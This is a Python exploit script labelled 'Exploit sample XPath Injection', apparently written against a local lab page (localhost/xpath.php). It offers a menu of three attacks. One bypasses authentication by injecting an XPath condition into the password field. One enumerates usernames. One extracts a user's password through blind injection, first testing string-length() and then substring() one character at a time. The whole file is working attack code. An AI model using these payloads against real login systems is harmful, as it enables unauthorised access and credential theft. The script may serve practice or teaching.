#!/usr/bin/python3.9
import requests
import json
import string
base_endpoint = "http://localhost/xpath.php" 

def bypass_auth(username: str):
    body = {
        "username" : username,
        "password" : f"' or username = '{username}",
        "submit" : "submit"
    }
    response = requests.post(base_endpoint,data=body)
    if response.status_code == 200 :
        json_data = json.loads(response.content)
        print(json.dumps(json_data,indent=2))
    else :
        json_data = json.loads(response.content)
        print(json.dumps(json_data,indent=2))

def user_enum(username: str):
    body = {
        "username" : username,
        "password" : f"' or username = '{username}",
        "submit" : "submit"
    }
    response = requests.post(base_endpoint,data=body)
    if response.status_code == 200 :
        print(f"Username \"{username}\" exists")
        return True
    else :
        print(f"Username \"{username}\" doesn't exist or App doesn't vulnerable")
        return False
    
def extract_password(username: str):
    # check username exists or doesn't
    if not user_enum(username) :
        exit()
    password_length = 1
    
    while True:
        body = {
            "username" : username,
            "password" : f"' or string-length(password) = {password_length} and username = '{username}",
            "submit" : "submit"
        }
        response = requests.post(base_endpoint,data=body)
        if response.status_code == 200 :
            break
        else :
            password_length += 1
        
        if password_length == 100 : exit()
        
    print(f"Password length is: {password_length}")
    
    index = 1
    chars = string.ascii_letters + string.digits
    password = ""
    while index <= password_length :
        for i in chars :
            body = {
                "username" : username,
                "password" : f"' or username = '{username}' and substring(password,{index},1) = '{i}",
                "submit" : "submit"
            }
            response = requests.post(base_endpoint,data=body)
            if response.status_code == 200 :
                password += i
                break
        index += 1
    print(f"Password is: {password}")

    
def switch(arg: int):
    if arg > 3 :
        arg = 0
    options =  {
        0 : 'exit()',
        1 : 'bypass_auth(username)',
        2 : 'user_enum(username)',
        3 : 'extract_password(username)'
    }
    return options.get(arg)

def main():
    
    text = """\rExploit sample XPath Injection
    \rOptions:
    \r0) Exit
    \r1) Bypass Authentication
    \r2) User Enumeration
    \r3) Extract Password
    """
    print(text)
    while True:
        try :
            choosed_option = int(input("Choose your option: "))
            break
        except ValueError :
            print("Input is empty or isn't number! Try again.")
    username = input("Enter the username: ")
    eval(switch(choosed_option))

if __name__ == "__main__" :
    main()
